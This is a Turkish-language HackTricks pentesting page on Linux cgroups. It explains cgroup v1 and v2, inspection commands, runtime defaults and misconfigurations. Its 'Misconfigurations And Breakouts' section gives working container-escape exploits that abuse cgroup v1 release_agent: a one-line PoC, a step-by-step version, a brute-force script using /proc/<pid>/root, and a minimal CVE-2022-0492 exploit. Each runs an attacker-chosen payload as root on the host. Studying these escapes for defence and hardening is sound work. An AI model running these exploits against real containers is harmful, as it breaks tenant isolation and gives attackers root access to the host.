# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux **control groups** çekirdeğin, işlemleri muhasebe, kısıtlama, önceliklendirme ve politika uygulama amaçlarıyla gruplayan mekanizmasıdır. Eğer namespaces büyük ölçüde kaynakların görünümünü izole etmekle ilgiliyse, cgroups esasen bir işlem kümesinin bu kaynakların **ne kadarını** tüketebileceğini ve bazı durumlarda **hangi kaynak sınıflarıyla** etkileşime girebileceğini yöneten mekanizmadır. Containers, kullanıcı onları doğrudan hiç incelemediğinde bile cgroups'e sürekli dayanır; çünkü neredeyse her modern runtime çekirdeğe "bu işlemler bu workload'a ait ve bunlara uygulanacak kaynak kuralları bunlardır" demenin bir yoluna ihtiyaç duyar.

Bu yüzden container engines yeni bir container'ı kendi cgroup alt ağacına yerleştirir. Process ağacı oraya yerleştiğinde, runtime bellek sınırlandırması koyabilir, PIDs sayısını sınırlayabilir, CPU kullanımına ağırlık verebilir, I/O'yu düzenleyebilir ve cihaz erişimini kısıtlayabilir. Üretim ortamında bu, çok kiracılı güvenlik ve basit operasyonel hijyen için hayati öneme sahiptir. Anlamlı kaynak kontrolleri olmayan bir container, belleği tüketebilir, sistemi işlemlerle doldurabilir veya host'u ya da komşu iş yüklerini dengesiz hale getirecek şekilde CPU ve I/O'yu tekelleştirebilir.

Güvenlik açısından, cgroups iki ayrı şekilde önem taşır. Birincisi, hatalı veya eksik kaynak sınırları doğrudan denial-of-service saldırılarına imkan sağlar. İkincisi, bazı cgroup özellikleri, özellikle eski **cgroup v1** düzenlemelerinde, bir container içinden yazılabilir olduklarında tarihsel olarak güçlü breakout primitifleri yaratmıştır.

## v1 Vs v2

Fiili durumda iki ana cgroup modeli vardır. **cgroup v1** birden fazla controller hiyerarşisini açığa çıkarır ve eski exploit writeup'ları genellikle oradaki tuhaf ve bazen aşırı güçlü semantiklere odaklanır. **cgroup v2** daha birleşik bir hiyerarşi ve genel olarak daha temiz bir davranış sunar. Modern dağıtımlar giderek cgroup v2'yi tercih ediyor, ancak karışık veya legacy ortamlar hâlâ mevcut; bu da gerçek sistemleri incelerken her iki modelin de hâlâ alakalı olduğu anlamına gelir.

Bu fark önemlidir çünkü en ünlü container breakout hikayelerinden bazıları, örneğin cgroup v1'deki **`release_agent`** kötüye kullanımları, çok özel olarak eski cgroup davranışıyla bağlantılıdır. Bir blogda bir cgroup exploit'i gören ve bunu körü körüne modern, yalnızca cgroup v2 kullanan bir sisteme uygulayan okur, hedefte gerçekte nelerin mümkün olduğunu yanlış anlayabilir.

## İnceleme

Mevcut shell'inizin nerede olduğunu görmek için en hızlı yol:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` dosyası mevcut süreçle ilişkilendirilmiş cgroup yollarını gösterir. Modern bir cgroup v2 host'ta genellikle tek bir birleşik giriş görürsünüz. Daha eski veya hibrit host'larda birden fazla v1 denetleyici yolu görebilirsiniz. Yolu öğrendikten sonra limitleri ve mevcut kullanımı görmek için ` /sys/fs/cgroup` altındaki ilgili dosyaları inceleyebilirsiniz.

Bir cgroup v2 host'ta, aşağıdaki komutlar faydalıdır:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Bu dosyalar hangi controller'ların mevcut olduğunu ve hangilerinin child cgroups'a devredildiğini ortaya çıkarır. Bu delege modeli, runtime'ın parent hiyerarşisinin gerçekten devrettiği cgroup işlevselliğinin yalnızca bir alt kümesini kontrol edebildiği rootless ve systemd-managed ortamlarda önemlidir.

## Lab

cgroups'ı uygulamada gözlemlemenin bir yolu, bellek sınırlandırılmış bir container çalıştırmaktır:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ayrıca PID ile sınırlı bir container deneyebilirsiniz:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Bu örnekler yararlıdır çünkü runtime bayrağını kernel dosya arabirimi ile ilişkilendirmeye yardımcı olurlar. Runtime kuralı sihirle uygulamıyor; ilgili cgroup ayarlarını yazıyor ve sonra kernel'in bunları süreç ağacına karşı uygulamasına izin veriyor.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O normal çalışmanın bir parçası olarak cgroups'a dayanırlar. Farklar genellikle cgroups kullanıp kullanmadıkları değil, **hangi varsayılanları seçtikleri**, **systemd ile nasıl etkileştikleri**, **rootless delegation'ın nasıl çalıştığı**, ve **yapılandırmanın ne kadarının engine seviyesinde versus orkestrasyon seviyesinde kontrol edildiği** ile ilgilidir.

Kubernetes'te resource request'ler ve limitler sonunda node üzerindeki cgroup yapılandırmasına dönüşür. Pod YAML'den kernel uygulamasına giden yol kubelet, CRI runtime ve OCI runtime üzerinden geçer, ama cgroups hâlâ kuralı nihayet uygulayan kernel mekanizmasıdır. Incus/LXC ortamlarında da cgroups yoğun şekilde kullanılır; özellikle system container'lar genellikle daha zengin bir süreç ağacı ve daha VM-benzeri operasyonel beklentiler sundukları için.

## Misconfigurations And Breakouts

Klasik cgroup güvenlik hikayesi yazılabilir **cgroup v1 `release_agent`** mekanizmasıdır. Bu modelde, bir saldırgan doğru cgroup dosyalarına yazabilse, `notify_on_release`'ı etkinleştirebilse ve `release_agent` içinde saklanan yolu kontrol edebilse, cgroup boşaldığında kernel host üzerindeki initial namespaces içinde saldırganın seçtiği yolu çalıştırabilir. Bu yüzden eski yazılar cgroup controller'ın yazılabilirliği, mount seçenekleri ve namespace/capability koşulları üzerinde çok durur.

`release_agent` kullanılabilir olmadığında bile cgroup hataları önemlidir. Aşırı geniş device erişimi container'dan host cihazlarına ulaşılmasını sağlayabilir. Eksik memory ve PID limitleri basit bir kod çalıştırmayı host DoS'una dönüştürebilir. Rootless senaryolarda zayıf cgroup delegation, runtime gerçekte bunu uygulayamamış olsa bile savunmayı yanıltıp bir kısıtlama varmış gibi gösterebilir.

### `release_agent` Arka Planı

`release_agent` tekniği yalnızca **cgroup v1** için geçerlidir. Temel fikir şu: bir cgroup'taki son süreç çıkıp `notify_on_release=1` ayarlıysa, kernel `release_agent` içinde saklanan yola karşılık gelen programı çalıştırır. Bu yürütme **initial namespaces on the host** içinde gerçekleşir; işte bu da yazılabilir bir `release_agent`'ı bir container escape ilkeline dönüştürür.

Tekniğin çalışması için saldırganın genellikle şunlara ihtiyacı vardır:

- yazılabilir bir **cgroup v1** hiyerarşisi
- bir child cgroup oluşturma veya kullanma yeteneği
- `notify_on_release`'ı ayarlama yeteneği
- `release_agent` içine bir yol yazma yeteneği
- host açısından bir yürütülebilir dosyaya çözümlenen bir yol

### Klasik PoC

Tarihi tek satırlık PoC şudur:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Bu PoC, bir payload yolunu `release_agent`'e yazar, cgroup release'ini tetikler ve ardından host üzerinde oluşturulan çıktı dosyasını geri okur.

### Anlaşılır Adım Adım Anlatım

Aynı fikir adımlara bölündüğünde daha kolay anlaşılır.

1. Yazılabilir bir cgroup oluşturun ve hazırlayın:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. container filesystem'ine karşılık gelen host path'ini belirleyin:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Ana makine yolundan görülebilecek bir payload bırakın:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup'u boşaltarak yürütmeyi tetikleyin:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Etkisi, payload'ın host tarafında root ayrıcalıklarıyla çalıştırılmasıdır. Gerçek bir exploit'te, payload genellikle bir kanıt dosyası yazar, bir reverse shell başlatır veya host durumunu değiştirir.

### Relative Path Variant Using `/proc/<pid>/root`

Bazı ortamlarda, container dosya sistemine giden host yolu belirgin olmayabilir veya storage driver tarafından gizlenmiş olabilir. Bu durumda payload yolu `/proc/<pid>/root/...` üzerinden ifade edilebilir; burada `<pid>`, mevcut container içindeki bir prosese ait host PID'sidir. Bu, relative-path brute-force variant'ın temelidir:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Buradaki ilgili hile kaba kuvvetin kendisi değil, yol biçimidir: `/proc/<pid>/root/...` çekirdeğin, doğrudan host depolama yolu önceden bilinmese bile, host isim alanından container dosya sistemi içindeki bir dosyayı çözmesine izin verir.

### CVE-2022-0492 Varyantı

2022'de CVE-2022-0492, cgroup v1'de `release_agent`'e yazmanın **ilk** kullanıcı isim alanında `CAP_SYS_ADMIN` için doğru şekilde kontrol edilmediğini gösterdi. Bu, bu tekniği zafiyetli çekirdeklerde çok daha erişilebilir hale getirdi; çünkü bir container süreci cgroup hiyerarşisini mount edebiliyorsa, host kullanıcı isim alanında zaten ayrıcalıklı olmadan `release_agent`'e yazabiliyordu.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Zafiyetli bir kernelde, host `/proc/self/exe` komutunu host root privileges ile çalıştırır.

Pratik istismar için, ortamın hâlâ writable cgroup-v1 paths veya dangerous device access açığa çıkarıp çıkarmadığını kontrol ederek başlayın:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Eğer `release_agent` mevcut ve yazılabiliyorsa, zaten legacy-breakout bölgesindesiniz:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Eğer cgroup yolu kendisi bir kaçış sağlamıyorsa, sonraki pratik kullanım genellikle denial of service veya reconnaissance olur:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Bu komutlar, iş yükünün fork-bomb yapmaya, belleği agresifçe tüketmeye ya da yazılabilir eski bir cgroup arayüzünü istismar etmeye imkanı olup olmadığını hızlıca söyler.

## Checks

Hedefi incelerken, cgroup kontrollerinin amacı hangi cgroup modelinin kullanıldığını, konteynerin yazılabilir controller yollarını görüp görmediğini ve `release_agent` gibi eski breakout primitives'in ilgili olup olmadığını belirlemektir.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Burada ilginç olanlar:

- Eğer `mount | grep cgroup` **cgroup v1** gösteriyorsa, eski breakout writeups daha alakalı hale gelir.
- Eğer `release_agent` mevcutsa ve erişilebilirse, bu hemen daha derin bir incelemeyi gerektirir.
- Eğer görünen cgroup hiyerarşisi yazılabilirse ve container ayrıca güçlü capabilities'e sahipse, ortam daha yakından incelenmeyi hak eder.

Eğer **cgroup v1**, yazılabilir controller mount'ları ve ayrıca güçlü capabilities'e sahip veya zayıf seccomp/AppArmor koruması olan bir container keşfederseniz, bu kombinasyon dikkatli inceleme gerektirir. cgroups genellikle sıkıcı bir kaynak-yönetimi konusu olarak ele alınır, ancak tarihsel olarak, "kaynak kontrolü" ile "host etkisi" arasındaki sınır her zaman insanların varsaydığı kadar temiz olmadığı için en öğretici container escape chains'in bir parçası olmuşlardır.

## Runtime Varsayılanları

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Container'lar otomatik olarak cgroups içine yerleştirilir; kaynak limitleri bayraklarla belirtilmedikçe isteğe bağlıdır | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Varsayılan olarak etkin | `--cgroups=enabled` varsayılandır; cgroup namespace varsayılanları cgroup sürümüne göre değişir (`private` cgroup v2'de, `host` bazı cgroup v1 kurulumlarında) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Varsayılan olarak runtime tarafından etkinleştirilir | Pod'lar ve container'lar node runtime tarafından cgroup'lara yerleştirilir; ince taneli kaynak kontrolü `resources.requests` / `resources.limits`'e bağlıdır | kaynak requests/limits belirtilmemesi, ayrıcalıklı cihaz erişimi, host düzeyinde runtime yanlış yapılandırması |
| containerd / CRI-O | Varsayılan olarak etkin | cgroups normal yaşam döngüsü yönetiminin parçasıdır | doğrudan runtime yapılandırmaları; cihaz kontrollerini gevşeten veya eski yazılabilir cgroup v1 arayüzlerini açığa çıkaran ayarlar |

Önemli ayrım şudur: **cgroup varlığı** genellikle varsayılandır, oysa **faydalı kaynak kısıtlamaları** genellikle açıkça yapılandırılmadıkça isteğe bağlıdır.
{{#include ../../../../banners/hacktricks-training.md}}
